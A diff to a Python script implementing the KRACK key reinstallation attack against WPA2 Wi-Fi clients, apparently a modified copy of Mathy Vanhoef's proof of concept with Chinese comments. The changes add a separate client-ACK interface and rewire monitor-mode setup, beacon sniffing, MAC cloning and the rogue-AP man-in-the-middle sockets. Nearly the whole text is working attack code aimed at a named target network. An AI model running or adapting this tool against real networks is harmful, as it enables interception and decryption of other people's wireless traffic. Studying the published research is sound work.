@@ -67,7 +67,6 @@ class MitmSocket(L2Socket):
 	def _strip_fcs(self, p):
 		# radiotap header flags 0x00...0: no used FCS failed
 		# .present is flagsfield
-
 		if p[RadioTap].present & 2 != 0:
 			rawframe = str(p[RadioTap])
 			pos = 8 # FCS 在 frame 開頭後第 9 bytes 的地方
@@ -440,9 +439,9 @@ class ClientState():
 		return self.is_state(ClientState.Attack_Started) and self.attack_time + 1.5 < time.time() and self.attack_max_iv < iv
 
 class KRAckAttack():
-	def __init__(self, nic_real, nic_rogue_ap, nic_rogue_mon, ssid, clientmac=None, dumpfile=None, cont_csa=False):
-		self.nic_real = nic_real
-		self.nic_real_clientack = None
+	def __init__(self, nic_real_mon, nic_real_clientack, nic_rogue_ap, nic_rogue_mon, ssid, clientmac=None, dumpfile=None, cont_csa=False):
+		self.nic_real_mon = nic_real_mon
+		self.nic_real_clientack = nic_real_clientack
 		self.nic_rogue_ap = nic_rogue_ap
 		self.nic_rogue_mon = nic_rogue_mon
 		self.dumpfile = dumpfile
@@ -480,13 +479,13 @@ class KRAckAttack():
 		self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)
 
 	def find_beacon(self, ssid):
-		ps = sniff(count=100, timeout=30, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real) # opened_socket=self.sock_real iface=self.nic_real
+		ps = sniff(count=100, timeout=30, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real_mon) # opened_socket=self.sock_real iface=self.nic_real_mon
 		if ps is None or len(ps) < 1:
 			log(STATUS, "Searching for target network on other channels")
 			for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
 				self.sock_real.set_channel(chan)
 				log(DEBUG, "Listening on channel %d" % chan)
-				ps = sniff(count=10, timeout=10, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real) # , opened_socket=self.sock_real
+				ps = sniff(count=10, timeout=10, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, iface=self.nic_real_mon) # , opened_socket=self.sock_real
 				if ps and len(ps) >= 1: break
 
 		if ps and len(ps) >= 1:
@@ -638,9 +637,8 @@ class KRAckAttack():
 	def handle_rx_realchan(self):
 		p = self.sock_real.recv()
 		if p == None: 
-			print("debug: none")
 			return
-
+		
 		print_rx(INFO, "debug: ", p)
 		# 1. Handle frames sent TO the real AP
 		if p.addr1 == self.apmac:
@@ -821,18 +819,15 @@ class KRAckAttack():
 		log(STATUS, "Note: keep >1 meter between both interfaces. Else packet delivery is unreliable & target may disconnect")
 
 		# 1. Remove unused virtual interfaces
-		subprocess.call(["iw", self.nic_real + "sta1", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
 		if self.nic_rogue_mon is None:
 			subprocess.call(["iw", self.nic_rogue_ap + "mon", "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
 
 		# 2. Configure monitor mode on interfaces
-		subprocess.check_output(["ifconfig", self.nic_real, "down"])
-		subprocess.check_output(["iwconfig", self.nic_real, "mode", "monitor"])
+		subprocess.check_output(["ifconfig", self.nic_real_mon, "down"])
+		subprocess.check_output(["iwconfig", self.nic_real_mon, "mode", "monitor"])
 		if self.nic_rogue_mon is None:
 			self.nic_rogue_mon = self.nic_rogue_ap + "mon"
 			subprocess.check_output(["iw", self.nic_rogue_ap, "interface", "add", self.nic_rogue_mon, "type", "monitor"])
-			# Some kernels (Debian jessie - 3.16.0-4-amd64) don't properly add the monitor interface. The following ugly
-			# sequence of commands to assure the virtual interface is registered as a 802.11 monitor interface.
 			subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
 			time.sleep(0.2)
 
@@ -842,8 +837,8 @@ class KRAckAttack():
 
 		# 如果有指定 client 端的 MAC addr.，將此網卡的 MAC addr.換成 client 端的
 		if self.clientmac:
-				self.nic_real_clientack = self.nic_real + "sta1"
-				subprocess.check_output(["iw", self.nic_real, "interface", "add", self.nic_real_clientack, "type", "managed"])
+				subprocess.check_output(["ifconfig", self.nic_real_clientack, "down"])
+				subprocess.check_output(["iwconfig", self.nic_real_clientack, "mode", "managed"])
 				call_macchanger(self.nic_real_clientack, self.clientmac)
 		else:
 			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
@@ -852,14 +847,14 @@ class KRAckAttack():
 			time.sleep(1)
 
 		# 4. Finally put the interfaces up
-		subprocess.check_output(["ifconfig", self.nic_real, "up"])
+		subprocess.check_output(["ifconfig", self.nic_real_mon, "up"])
 		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
 	
 	# 主要執行 func.
 	def run(self, strict_echo_test=False):
 		self.configure_interfaces()
 
-		self.sock_real  = MitmSocket(type=ETH_P_ALL, iface=self.nic_real     , dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
+		self.sock_real  = MitmSocket(type=ETH_P_ALL, iface=self.nic_real_mon     , dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
 		self.sock_rogue = MitmSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon, dumpfile=self.dumpfile, strict_echo_test=strict_echo_test)
 		# 測試監聽模式是否有正常運行，並且取得 wifi ap 的 MAC addr.
 		self.find_beacon(self.ssid)
@@ -885,7 +880,7 @@ class KRAckAttack():
 		# Put the client ACK interface up (at this point switching channels on nic_real may no longer be possible)
 		if self.nic_real_clientack: 
 			subprocess.check_output(["ifconfig", self.nic_real_clientack, "up"])
-			subprocess.check_output(["ifconfig", self.nic_real, "up"])
+			subprocess.check_output(["ifconfig", self.nic_real_mon, "up"])
 
 
 		# FIXME: Set BFP filters to increase performance, can't set suceessful.
@@ -975,6 +970,7 @@ if __name__ == "__main__":
 	parser = argparse.ArgumentParser(description=description, formatter_class=argparse.RawDescriptionHelpFormatter)
 	# 必要的參數
 	parser.add_argument("nic_real_mon", help="Wireless monitor interface that will listen on the channel of the target AP.")
+	parser.add_argument("nic_real_clientack", help="Wireless monitor interface that will station on the channel of the target AP.")
 	parser.add_argument("nic_rogue_ap", help="Wireless monitor interface that will run a rogue AP using a modified hostapd.")
 	parser.add_argument("ssid", help="The SSID of the network to attack.")
 	parser.add_argument("password", help="The password of the network to attack.")
@@ -993,7 +989,7 @@ if __name__ == "__main__":
 	global_log_level = max(ALL, global_log_level - args.debug)
 
 	print("\n\t===[ KRACK Attacks against Linux/Android by Mathy Vanhoef ]====\n")
-	attack = KRAckAttack(args.nic_real_mon, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.target, args.dump, args.continuous_csa)
+	attack = KRAckAttack(args.nic_real_mon, args.nic_real_clientack, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.target, args.dump, args.continuous_csa)
 	atexit.register(cleanup)
 	attack.run(strict_echo_test=args.strict_echo_test)
 
